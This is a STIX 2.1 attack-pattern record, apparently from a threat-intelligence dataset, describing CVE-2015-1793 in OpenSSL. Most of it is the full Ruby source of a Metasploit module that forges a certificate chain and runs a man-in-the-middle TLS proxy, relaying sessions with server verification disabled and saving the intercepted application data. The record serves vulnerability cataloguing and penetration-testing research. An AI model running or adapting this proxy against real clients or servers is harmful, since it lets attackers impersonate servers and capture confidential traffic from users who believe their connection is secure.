{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2864c814-317e-4307-a95d-dafb4babb9ac",
    "created": "2024-08-14T16:21:55.036205Z",
    "modified": "2024-08-14T16:21:55.036209Z",
    "name": "OpenSSL Alternative Chains Certificate Forgery MITM Proxy",
    "description": " This module exploits a logic error in OpenSSL by impersonating the server and sending a specially-crafted chain of certificates, resulting in certain checks on untrusted certificates to be bypassed on the client allowing it to use a valid leaf certificate as a CA certificate to sign a fake certificate. The SSL/TLS session is then proxied to the server allowing the session to continue normally and application data transmitted between the peers to be saved.  The valid leaf certificate must not contain the keyUsage extension or it must have at least the keyCertSign bit set (see X509_check_issued function in crypto/x509v3/v3_purp.c); otherwise; X509_verify_cert fails with X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY. This module requires an active man-in-the-middle attack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/openssl_altchainsforgery_mitm_proxy.rb",
            "external_id": "openssl_altchainsforgery_mitm_proxy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1793"
        },
        {
            "source_name": "reference",
            "url": "http://git.openssl.org/?p=openssl.git;a=commit;h=f404943bcab4898d18f3ac1b36479d1d7bbbb9e6"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'OpenSSL Alternative Chains Certificate Forgery MITM Proxy',\n      'Description'    => %q{\n        This module exploits a logic error in OpenSSL by impersonating the server\n        and sending a specially-crafted chain of certificates, resulting in\n        certain checks on untrusted certificates to be bypassed on the client,\n        allowing it to use a valid leaf certificate as a CA certificate to sign a\n        fake certificate. The SSL/TLS session is then proxied to the server\n        allowing the session to continue normally and application data transmitted\n        between the peers to be saved.\n\n        The valid leaf certificate must not contain the keyUsage extension or it\n        must have at least the keyCertSign bit set (see X509_check_issued function\n        in crypto/x509v3/v3_purp.c); otherwise; X509_verify_cert fails with\n        X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY. This module requires an\n        active man-in-the-middle attack.\n      },\n      'Author'      =>\n        [\n          'David Benjamin', # Vulnerability discovery\n          'Adam Langley', # Vulnerability discovery\n          'Ramon de C Valle' # Metasploit module\n        ],\n      'License' => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run MITM proxy' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service',\n      'References' => [\n        ['CVE', '2015-1793'],\n        ['CWE', '754'],\n        ['URL', 'http://git.openssl.org/?p=openssl.git;a=commit;h=f404943bcab4898d18f3ac1b36479d1d7bbbb9e6']\n      ],\n      'DisclosureDate' => 'Jul 9 2015'\n    )\n\n    register_options(\n      [\n        OptString.new('CACERT', [ true, \"The leaf certificate's CA certificate\", nil]),\n        OptString.new('CERT', [ true, 'The leaf certificate', nil]),\n        OptString.new('KEY', [ true, \"The leaf certificate's private key\", nil]),\n        OptString.new('PASSPHRASE', [ false, \"The pass phrase for the leaf certificate's private key\", nil]),\n        OptString.new('SUBJECT', [ false, 'The subject field for the fake certificate', '/C=US/ST=California/L=Mountain View/O=Example Inc/CN=*.example.com']),\n        OptString.new('HOST', [ true, 'The server address', nil]),\n        OptPort.new('PORT', [ true, 'The server port', 443]),\n        OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),\n        OptString.new('SRVPORT', [ true, 'The proxy port', 443])\n      ])\n  end\n\n  def cleanup\n    super\n    return unless @proxy\n\n    begin\n      @proxy.deref if @proxy.kind_of?(Rex::Service)\n      if @proxy.kind_of?(Rex::Socket)\n        @proxy.close\n        @proxy.stop\n      end\n      @proxy = nil\n    rescue ::Exception\n    end\n  end\n\n  def run\n    host = datastore['HOST']\n    port = datastore['PORT']\n    local_host = datastore['SRVHOST']\n    local_port = datastore['SRVPORT']\n\n    root_ca_name = OpenSSL::X509::Name.parse('/C=US/O=Root Inc./CN=Root CA')\n    root_ca_key = OpenSSL::PKey::RSA.new(2048)\n    root_ca_cert = OpenSSL::X509::Certificate.new\n    root_ca_cert.issuer = OpenSSL::X509::Name.parse('/C=US/O=Root Inc./CN=Root CA')\n    root_ca_cert.not_after = Time.now + 86400\n    root_ca_cert.not_before = Time.now\n    root_ca_cert.public_key = root_ca_key.public_key\n    root_ca_cert.serial = 0\n    root_ca_cert.subject = root_ca_name\n    root_ca_cert.version = 2\n    extension_factory = OpenSSL::X509::ExtensionFactory.new(root_ca_cert, root_ca_cert)\n    root_ca_cert.add_extension(extension_factory.create_extension('basicConstraints', 'CA:TRUE', true))\n    root_ca_cert.add_extension(extension_factory.create_extension('keyUsage', 'keyCertSign,cRLSign', true))\n    root_ca_cert.add_extension(extension_factory.create_extension('subjectKeyIdentifier', 'hash'))\n    root_ca_cert.sign(root_ca_key, OpenSSL::Digest.new('SHA1'))\n\n    inter_ca_name = OpenSSL::X509::Name.parse('/C=US/O=Intermediate Inc./CN=Intermediate CA')\n    inter_ca_key = OpenSSL::PKey::RSA.new(2048)\n    inter_ca_cert = OpenSSL::X509::Certificate.new\n    inter_ca_cert.issuer = root_ca_name\n    inter_ca_cert.not_after = Time.now + 86400\n    inter_ca_cert.not_before = Time.now\n    inter_ca_cert.public_key = inter_ca_key.public_key\n    inter_ca_cert.serial = 0\n    inter_ca_cert.subject = inter_ca_name\n    inter_ca_cert.version = 2\n    extension_factory = OpenSSL::X509::ExtensionFactory.new(root_ca_cert, inter_ca_cert)\n    inter_ca_cert.add_extension(extension_factory.create_extension('basicConstraints', 'CA:TRUE', true))\n    inter_ca_cert.add_extension(extension_factory.create_extension('keyUsage', 'keyCertSign,cRLSign', true))\n    inter_ca_cert.add_extension(extension_factory.create_extension('subjectKeyIdentifier', 'hash'))\n    inter_ca_cert.sign(root_ca_key, OpenSSL::Digest.new('SHA1'))\n\n    subinter_ca_cert = OpenSSL::X509::Certificate.new(File.read(datastore['CACERT']))\n    subinter_ca_cert.issuer = inter_ca_name\n    subinter_ca_cert.sign(inter_ca_key, OpenSSL::Digest.new('SHA1'))\n    leaf_key = OpenSSL::PKey::RSA.new(File.read(datastore['KEY']), datastore['PASSPHRASE'])\n    leaf_cert = OpenSSL::X509::Certificate.new(File.read(datastore['CERT']))\n\n    fake_name = OpenSSL::X509::Name.parse(datastore['SUBJECT'])\n    fake_key = OpenSSL::PKey::RSA.new(2048)\n    fake_cert = OpenSSL::X509::Certificate.new\n    fake_cert.issuer = leaf_cert.subject\n    fake_cert.not_after = Time.now + 3600\n    fake_cert.not_before = Time.now\n    fake_cert.public_key = fake_key.public_key\n    fake_cert.serial = 0\n    fake_cert.subject = fake_name\n    fake_cert.version = 2\n    extension_factory = OpenSSL::X509::ExtensionFactory.new(leaf_cert, fake_cert)\n    fake_cert.add_extension(extension_factory.create_extension('basicConstraints', 'CA:FALSE', true))\n    fake_cert.add_extension(extension_factory.create_extension('keyUsage', 'digitalSignature,nonRepudiation,keyEncipherment'))\n    fake_cert.add_extension(extension_factory.create_extension('subjectKeyIdentifier', 'hash'))\n    fake_cert.sign(leaf_key, OpenSSL::Digest.new('SHA1'))\n\n    context = OpenSSL::SSL::SSLContext.new\n    context.cert = fake_cert\n    context.extra_chain_cert = [leaf_cert, subinter_ca_cert]\n    context.key = fake_key\n\n    @proxy = Rex::Socket::SslTcpServer.create(\n      'LocalHost' => local_host,\n      'LocalPort' => local_port,\n      'SSLContext' => context,\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self\n        })\n\n    print_status('Listening on %s:%d' % [local_host, local_port])\n\n    thread_num = 0\n\n    loop do\n      framework.threads.spawn(\"Thread #{thread_num += 1}\", false, @proxy.accept) do |client|\n        add_socket(client)\n        application_data = ''\n        print_status('Accepted connection from %s:%d' % [client.peerhost, client.peerport])\n\n        server = Rex::Socket::Tcp.create(\n          'PeerHost' => host,\n          'PeerPort' => port,\n          'SSL'      => true,\n          'SSLVerifyMode' => 'NONE',\n          'Context'  =>\n            {\n              'Msf'        => framework,\n              'MsfExploit' => self\n            })\n        add_socket(server)\n\n        print_status('Connected to %s:%d' % [host, port])\n\n        begin\n          loop do\n            readable, _, _ = Rex::ThreadSafe.select([client, server])\n\n            readable.each do |r|\n              data = r.get_once\n              print_status('%d bytes received' % [data.bytesize])\n\n              application_data << data\n\n              case r\n              when client\n                count = server.put(data)\n                print_status('%d bytes sent' % [count])\n              when server\n                count = client.put(data)\n                print_status('%d bytes sent' % [count])\n              end\n            end\n          end\n\n        rescue EOFError, Errno::ECONNRESET\n          path = store_loot(\n            'tls.application_data',\n            'application/octet-stream',\n            client.peerhost,\n            application_data,\n            'application_data',\n            'TLS session application data'\n          )\n\n          print_good(\"SSL/TLS session application data successfully stored in #{path}\")\n\n          client.close\n          server.close\n\n          next\n        end\n\n        client.close\n        server.close\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Jul 9 2015"
}